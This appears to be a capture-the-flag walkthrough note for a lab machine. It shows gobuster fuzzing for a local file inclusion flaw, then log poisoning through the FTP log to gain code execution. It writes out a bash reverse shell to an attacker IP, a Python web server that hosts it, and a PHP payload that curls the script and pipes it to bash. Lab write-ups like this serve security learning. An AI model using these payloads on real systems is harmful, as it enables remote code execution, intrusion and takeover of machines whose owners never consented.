# LFI

http://10.129.185.55/admin../admin_staging/index.php?page=user.php

## Fuzzing

```bash
┌──(root💀kali)-[~]
└─# gobuster fuzz -u "http://10.129.185.55/admin../admin_staging/index.php?page=FUZZ" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt --exclude-length 15349
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://10.129.185.55/admin../admin_staging/index.php?page=FUZZ
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
[+] Exclude Length:   15349
[+] User Agent:       gobuster/3.1.0
[+] Timeout:          10s
===============================================================
2021/07/18 07:20:15 Starting gobuster in fuzzing mode
===============================================================
Found: [Status=200] [Length=61821] http://10.129.185.55/admin../admin_staging/index.php?page=/var/log/dpkg.log
Found: [Status=200] [Length=47381] http://10.129.185.55/admin../admin_staging/index.php?page=/var/log/faillog 
Found: [Status=200] [Length=307641] http://10.129.185.55/admin../admin_staging/index.php?page=/var/log/lastlog
Found: [Status=200] [Length=19803] http://10.129.185.55/admin../admin_staging/index.php?page=/var/log/vsftpd.log
Found: [Status=200] [Length=167029] http://10.129.185.55/admin../admin_staging/index.php?page=/var/log/wtmp     
                                                                                                                
===============================================================
2021/07/18 07:20:17 Finished
===============================================================
```


# Log Poisoning to RCE

FTP Port is open, so we can poison FTP and get Code injection while viewing the log.

```bash
Found: [Status=200] [Length=19803] http://10.129.185.55/admin../admin_staging/index.php?page=/var/log/vsftpd.log
```

![[Pasted image 20210718122420.png]]

![[Pasted image 20210718122407.png]]


## Upload rev.sh

```bash
cat rev.sh 
bash -i >& /dev/tcp/10.10.15.18/9001 0>&1

python3 -m http.server 80
```


```php
<?php system("curl http://10.10.15.18/rev.sh | bash"); ?>
```

